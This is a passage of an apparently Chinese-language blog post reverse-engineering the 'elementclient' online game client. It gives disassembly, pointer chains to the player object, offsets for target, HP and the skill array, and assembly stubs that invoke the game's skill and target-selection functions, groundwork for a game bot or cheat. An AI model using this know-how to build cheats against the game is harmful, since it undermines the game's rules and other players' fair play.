class=\"line\">00CE92CD  | FFD0                   | call eax                              | </span><br><span class=\"line\">//游戏崩溃</span><br><span class=\"line\"></span><br><span class=\"line\">00CE92D3  | 8B43 08                | mov eax,dword ptr ds:[ebx+8]          | 4DB4BCF0</span><br><span class=\"line\">00CE92D6  | 8BCE                   | mov ecx,esi                           | 7082C9E8</span><br><span class=\"line\">00CE92D8  | 6A FF                  | push FFFFFFFF                         |</span><br><span class=\"line\">00CE92DA  | 6A 00                  | push 0                                |</span><br><span class=\"line\">00CE92DC  | 6A 00                  | push 0                                |</span><br><span class=\"line\">00CE92DE  | FF70 08                | push dword ptr ds:[eax+8]             | 7D</span><br><span class=\"line\">00CE92E1  | E8 4A4BE5FF            | call elementclient.B3DE30             |</span><br><span class=\"line\">//技能call</span><br><span class=\"line\"></span><br><span class=\"line\">00B3E487  | 57                     | push edi                              | 687763E8</span><br><span class=\"line\">00B3E488  | FF73 08                | push dword ptr ds:[ebx+8]             | 7D</span><br><span class=\"line\">00B3E48B  | E8 A0A9E7FF            | call elementclient.9B8E30             |</span><br><span class=\"line\">//游戏崩溃</span><br><span class=\"line\"></span><br><span class=\"line\">00B3E62D  | 50                     | push eax                              | 0</span><br><span class=\"line\">00B3E62E  | FF73 08                | push dword ptr ds:[ebx+8]             | 7D</span><br><span class=\"line\">00B3E631  | FF75 10                | push dword ptr ss:[ebp+10]            | 80001A0B</span><br><span class=\"line\">00B3E634  | 68 886D2701            | push elementclient.1276D88            | 1276D88</span><br><span class=\"line\">00B3E639  | 6A 01                  | push 1                                |</span><br><span class=\"line\">00B3E63B  | E8 C0F83100            | call elementclient.E5DF00             |</span><br><span class=\"line\">00B3E640  | 8B8F F4270000          | mov ecx,dword ptr ds:[edi+27F4]       | 6F3CAE58  edi= 5F4F6320 + 0x27F4</span><br><span class=\"line\">00B3E646  | 83C4 14                | add esp,14                            |</span><br><span class=\"line\">//无反应</span><br><span class=\"line\"></span><br><span class=\"line\">00B41F83  | FF70 08                | push dword ptr ds:[eax+8]             | 7D</span><br><span class=\"line\">00B41F86  | E8 75750000            | call elementclient.B49500             |</span><br><span class=\"line\">//无反应</span><br><span class=\"line\"></span><br><span class=\"line\">00B425F8  | FF70 08                | push dword ptr ds:[eax+8]             | 7D </span><br><span class=\"line\">00B425FB  | E8 5034E5FF            | call elementclient.995A50             </span><br><span class=\"line\">//游戏崩溃</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00B42E62  | 50                     | push eax                              | 0019EE7C</span><br><span class=\"line\">00B42E63  | 8B87 00280000          | mov eax,dword ptr ds:[edi+2800]       | 5395BDF0</span><br><span class=\"line\">00B42E69  | 6A 01                  | push 1                                | 1</span><br><span class=\"line\">00B42E6B  | FF75 C8                | push dword ptr ss:[ebp-38]            | 241D4300</span><br><span class=\"line\">00B42E6E  | FF70 08                | push dword ptr ds:[eax+8]             | 7D</span><br><span class=\"line\">00B42E71  | A1 38EE4F01            | mov eax,dword ptr ds:[14FEE38]        | 015084F8</span><br><span class=\"line\">00B42E76  | 8B48 20                | mov ecx,dword ptr ds:[eax+20]         | 29EBB028</span><br><span class=\"line\">00B42E79  | 81C1 EC000000          | add ecx,EC                            |</span><br><span class=\"line\">00B42E7F  | E8 3C96E6FF            | call elementclient.9AC4C0             |</span><br><span class=\"line\">//技能不可用</span><br><span class=\"line\"></span><br><span class=\"line\">00B356C5  | 6A 00                  | push 0                                |</span><br><span class=\"line\">00B356C7  | FF70 08                | push dword ptr ds:[eax+8]             | 7D</span><br><span class=\"line\">00B356CA  | E8 F14C1100            | call elementclient.C4A3C0             |</span><br><span class=\"line\">//无反应</span><br><span class=\"line\"></span><br><span class=\"line\">00B5E54D  | FF71 04                | push dword ptr ds:[ecx+4]                      |</span><br><span class=\"line\">00B5E550  | FF70 08                | push dword ptr ds:[eax+8]                      |</span><br><span class=\"line\">00B5E553  | E8 D8A8E5FF            | call elementclient.9B8E30                      |</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00CE922A  | A1 38EE4F01            | mov eax,dword ptr ds:[14FEE38]                 | 015084F8</span><br><span class=\"line\">00CE922F  | 56                     | push esi                                       | 06D077F8</span><br><span class=\"line\">00CE9230  | 57                     | push edi                                       | 658C4488</span><br><span class=\"line\">00CE9231  | FF71 08                | push dword ptr ds:[ecx+8]                      | 0000007D</span><br><span class=\"line\">00CE9234  | 8B40 1C                | mov eax,dword ptr ds:[eax+1C]                  | 1D2429C0</span><br><span class=\"line\">00CE9237  | 8B70 30                | mov esi,dword ptr ds:[eax+30]                  | 7082C9E8</span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">00CE92D3  | 8B43 08                | mov eax,dword ptr ds:[ebx+8]          | 4DB4BCF0</span><br><span class=\"line\">00CE92D6  | 8BCE                   | mov ecx,esi                           | 7082C9E8，ecx的值，人物信息基地址  5F4F6320</span><br><span class=\"line\">00CE92D8  | 6A FF                  | push FFFFFFFF                         |</span><br><span class=\"line\">00CE92DA  | 6A 00                  | push 0                                |</span><br><span class=\"line\">00CE92DC  | 6A 00                  | push 0                                |</span><br><span class=\"line\">00CE92DE  | FF70 08                | push dword ptr ds:[eax+8]             | 7D，技能ID</span><br><span class=\"line\">00CE92E1  | E8 4A4BE5FF            | call elementclient.B3DE30             |</span><br><span class=\"line\"></span><br><span class=\"line\">[[[14FEE38]+1C]+30] = 7082C9E8   即为this指针</span><br><span class=\"line\">[[[[[[[0x1508514]+98]+4]+1C]+1*4+1C]+8]+30] = 7082C9E8</span><br><span class=\"line\">[[[[[[[[0x15084F8+1C]+98]+4]+1C]+1*4+1C]+8]+30] = 7082C9E8</span><br></pre></td></tr></table></figure>\n<p>人物选择目标（玩家，怪物，npc 分析）</p>\n<p>选中</p>\n<p>当前 this 指针 [[[14FEE38]+1C]+30] = 5F4F6320</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101115006092.png\" alt=\"image-20230101115006092\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101115309026.png\" alt=\"image-20230101115309026\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101115332221.png\" alt=\"image-20230101115332221\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">80001A0B 是戒灵的ID</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230101115607140.png\" alt=\"image-20230101115607140\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">对于不同的囚徒怨魂有不同的ID</span><br><span class=\"line\">80001C4A - 80001C4F</span><br><span class=\"line\">推测某个地域上囚徒怨魂有ID范围，每个ID唯一</span><br><span class=\"line\">戒灵唯一，因此ID也只有一个</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">009AC900 - 89 B0 04090000  - mov [eax+00000904],esi</span><br><span class=\"line\">00B31E36 - 89 86 04090000  - mov [esi+00000904],eax</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>思路：</p>\n<p>1. 在人物对象偏移地址中找找看是否有与选中的目标相关的信息 (譬如：ID 或者目标对象的地址)，然后通过内存断点分析访问这些信息的代码，来确定选中目标的 call</p>\n<p>2. 网游可以通过 send 函数断点来分析选中目标的操作 (和释放技能 call 分析类似)</p>\n<p>思路一：</p>\n<p>1. 上面已经找到一个与任务选中目标的相关信息 (人物选择中的目标 ID)</p>\n<p>2. 对这个内存下写入访问 / 写入的断点</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">009AC900  |.  89B0 04090000 mov dword ptr ds:[eax+0x904],esi</span><br><span class=\"line\"></span><br><span class=\"line\">00B54582  |&gt; \\A1 38EE4F01   mov eax,dword ptr ds:[0x14FEE38]      015084F8</span><br><span class=\"line\">00B54587  |.  56            push esi                              80001C56</span><br><span class=\"line\">00B54588  |.  8B48 20       mov ecx,dword ptr ds:[eax+0x20]       11B3C028</span><br><span class=\"line\">00B5458B  |.  81C1 EC000000 add ecx,0xEC</span><br><span class=\"line\">00B54591  |.  E8 3A83E5FF   call ElementC.009AC8D0</span><br><span class=\"line\"></span><br><span class=\"line\">mov eax,dword ptr ds:[0x14FEE38]</span><br><span class=\"line\">push 80001A0B</span><br><span class=\"line\">mov ecx,dword ptr ds:[eax+0x20]</span><br><span class=\"line\">add ecx,0x0EC</span><br><span class=\"line\">call 009AC8D0</span><br></pre></td></tr></table></figure>\n<h4 id=\"更新-202315\"><a class=\"markdownIt-Anchor\" href=\"#更新-202315\">#</a> 更新 2023.1.5</h4>\n<p>释放技能 call</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00CE9EE3              | 8B43 08                | mov eax,dword ptr ds:[ebx+8]                   |</span><br><span class=\"line\">00CE9EE6              | 8BCE                   | mov ecx,esi                                    |</span><br><span class=\"line\">00CE9EE8              | 6A FF                  | push FFFFFFFF                                  |</span><br><span class=\"line\">00CE9EEA              | 6A 00                  | push 0                                         |</span><br><span class=\"line\">00CE9EEC              | 6A 00                  | push 0                                         |</span><br><span class=\"line\">00CE9EEE              | FF70 08                | push dword ptr ds:[eax+8]                      |</span><br><span class=\"line\">00CE9EF1              | E8 7A4BE5FF            | call elementclient.B3EA70                      |</span><br><span class=\"line\"></span><br><span class=\"line\">00CE9E3A              | A1 38EE4F01            | mov eax,dword ptr ds:[14FEE38]                 |</span><br><span class=\"line\">00CE9E3F              | 56                     | push esi                                       |</span><br><span class=\"line\">00CE9E40              | 57                     | push edi                                       |</span><br><span class=\"line\">00CE9E41              | FF71 08                | push dword ptr ds:[ecx+8]                      |</span><br><span class=\"line\">00CE9E44              | 8B40 1C                | mov eax,dword ptr ds:[eax+1C]                  |</span><br><span class=\"line\">00CE9E47              | 8B70 30                | mov esi,dword ptr ds:[eax+30]                  |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ecx = esi = [eax+30] = [[[14FEE38]+1C]+30]</span><br><span class=\"line\"></span><br><span class=\"line\">mov ecx,14FEE38</span><br><span class=\"line\">mov ecx,[ecx]</span><br><span class=\"line\">mov ecx,[ecx+1C]</span><br><span class=\"line\">mov ecx,[ecx+30]</span><br><span class=\"line\">push -1</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 7D</span><br><span class=\"line\">call 0x0B3EA70</span><br><span class=\"line\"></span><br><span class=\"line\">ecx 就是this指针 [[[14FEE38]+1C]+30] = 65573810 = [[[[[[[0x1508514]+98]+4]+1C]+1*4+1C]+8]+30]</span><br></pre></td></tr></table></figure>\n<p>定位怪物 ID</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00B6AC16  |.  6A 00         push 0x0</span><br><span class=\"line\">00B6AC18  |.  50            push eax</span><br><span class=\"line\">00B6AC19  |.  FF76 08       push dword ptr ds:[esi+0x8]  80001A0B</span><br><span class=\"line\">00B6AC1C  |.  E8 8F85FDFF   call ElementC.00B431B0</span><br><span class=\"line\"></span><br><span class=\"line\">在CE中通过选中怪物切换得到30E32FC4,并且和this指针相邻</span><br><span class=\"line\">65574114 - 65573810 = 904</span><br><span class=\"line\">即人物this指针的+904的位置是所选定怪物</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230105200144107.png\" alt=\"image-20230105200144107\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">009AD0A0 - 89 B0 04090000  - mov [eax+00000904],esi</span><br><span class=\"line\">00B32816 - 89 86 04090000  - mov [esi+00000904],eax</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">009AD0A0              | 89B0 04090000          | mov dword ptr ds:[eax+904],esi                 |</span><br><span class=\"line\">009AD0A6              | 8D45 F8                | lea eax,dword ptr ss:[ebp-8]                   |</span><br><span class=\"line\">009AD0A9              | 50                     | push eax                                       |</span><br><span class=\"line\">009AD0AA              | 8D45 08                | lea eax,dword ptr ss:[ebp+8]                   |</span><br><span class=\"line\">009AD0AD              | 50                     | push eax                                       |</span><br><span class=\"line\">009AD0AE              | E8 0D070000            | call elementclient.9AD7C0                      |</span><br><span class=\"line\"></span><br><span class=\"line\">00B551C2              | A1 38EE4F01            | mov eax,dword ptr ds:[14FEE38]                 | 015084F8</span><br><span class=\"line\">00B551C7              | 56                     | push esi                                       | 80001A0B</span><br><span class=\"line\">00B551C8              | 8B48 20                | mov ecx,dword ptr ds:[eax+20]                  | 1D01F028</span><br><span class=\"line\">00B551CB              | 81C1 EC000000          | add ecx,EC                                     |</span><br><span class=\"line\">00B551D1              | E8 9A7EE5FF            | call elementclient.9AD070                      |</span><br><span class=\"line\"></span><br><span class=\"line\">mov eax,dword ptr ds:[14FEE38]      </span><br><span class=\"line\">push 80001A0B</span><br><span class=\"line\">mov ecx,dword ptr ds:[eax+20]</span><br><span class=\"line\">add ecx,0x0EC           </span><br><span class=\"line\">call 9AD070</span><br></pre></td></tr></table></figure>\n<p>人物技能分析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00CE9EEE              | FF70 08                | push dword ptr ds:[eax+8]                      |</span><br><span class=\"line\"></span><br><span class=\"line\">回城术 A7</span><br><span class=\"line\">458AB5E0</span><br><span class=\"line\"></span><br><span class=\"line\">清心咒 71</span><br><span class=\"line\">493BCA60</span><br><span class=\"line\"></span><br><span class=\"line\">羽剑 7D</span><br><span class=\"line\">458AB880</span><br><span class=\"line\"></span><br><span class=\"line\">龙卷风 7F</span><br><span class=\"line\">4589E0D0</span><br><span class=\"line\"></span><br><span class=\"line\">静心咒 72</span><br><span class=\"line\">458AB6F8</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">3D82F288 493BCA60 `Ê;I   </span><br><span class=\"line\">3D82F28C 458AB6F8 ø¶.E   </span><br><span class=\"line\">3D82F290 458AB880 .¸.E   </span><br><span class=\"line\">3D82F294 4589E0D0 Ðà.E   </span><br><span class=\"line\">3D82F298 458AB5E0 àµ.E   </span><br><span class=\"line\"></span><br><span class=\"line\">493BCA60 01297268 hr). </span><br><span class=\"line\">493BCA64 2E164EA8 ¨N.. </span><br><span class=\"line\">493BCA68 00000071 q... </span><br><span class=\"line\">493BCA6C 00000005 .... </span><br><span class=\"line\"></span><br><span class=\"line\">2E164EA8 1046C5DC ÜÅF. </span><br><span class=\"line\">2E164EAC 10830198 .... </span><br><span class=\"line\">2E164EB0 00000000 .... </span><br><span class=\"line\">2E164EB4 00000000 .... </span><br><span class=\"line\"></span><br><span class=\"line\">10830198 10542A90 .*T. elementskill.&amp;?GetRequiredGenius@ElementSkill@GNET@@UAEPAHH@Z</span><br><span class=\"line\">1083019C 00000071 q... </span><br><span class=\"line\">108301A0 00000007 .... </span><br><span class=\"line\">108301A4 10542AE8 è*T. L&quot;清心咒&quot;</span><br><span class=\"line\">108301A8 10542AF0 ð*T. &quot;清心咒&quot;</span><br><span class=\"line\">108301AC 10542AF8 ø*T. &quot;清心咒.dds&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">10542AE8 5FC36E05 .nÃ_ </span><br><span class=\"line\">10542AEC 00005492 .T.. </span><br><span class=\"line\">10542AF0 C4D0E5C7 ÇåÐÄ </span><br><span class=\"line\">10542AF4 0000E4D6 Öä.. </span><br><span class=\"line\">10542AF8 C4D0E5C7 ÇåÐÄ </span><br><span class=\"line\"></span><br><span class=\"line\">[[[[3D82F288]+4]+4]+0x0C]</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230105204555127.png\" alt=\"image-20230105204555127\"></p>\n<p>5E5D69F8 - 5E5D41D8 = 2820</p>\n<p>人物 this 指针 + 2820 就是技能数组的首地址，通过技能数组的首地址可以找到技能的全部信息</p>\n<h4 id=\"更新结束\"><a class=\"markdownIt-Anchor\" href=\"#更新结束\">#</a> 更新结束</h4>\n<h4 id=\"更新2023111\"><a class=\"markdownIt-Anchor\" href=\"#更新2023111\">#</a> 更新 2023.1.11</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.人物this指针</span><br><span class=\"line\">00B2ECD5 - 89 86 8C070000  - mov [esi+0000078C],eax</span><br><span class=\"line\">当前血量 = [esi + 78C]    esi = 5EB45680</span><br><span class=\"line\"></span><br><span class=\"line\">00B2EBB7             | 8BF1                  | mov esi,ecx                           |</span><br><span class=\"line\">当前血量 = [ecx + 78C]    ecx = 5EB45680</span><br><span class=\"line\"></span><br><span class=\"line\">00B391E2             | E8 C959FFFF           | call elementclient.B2EBB0             |</span><br><span class=\"line\"></span><br><span class=\"line\">00BF23C8             | FF52 68               | call dword ptr ds:[edx+68]            |</span><br><span class=\"line\"></span><br><span class=\"line\">00BF23C4             | 8BC8                  | mov ecx,eax                           |</span><br><span class=\"line\">当前血量 = [eax + 78C]    eax = 5EB45680</span><br><span class=\"line\"></span><br><span 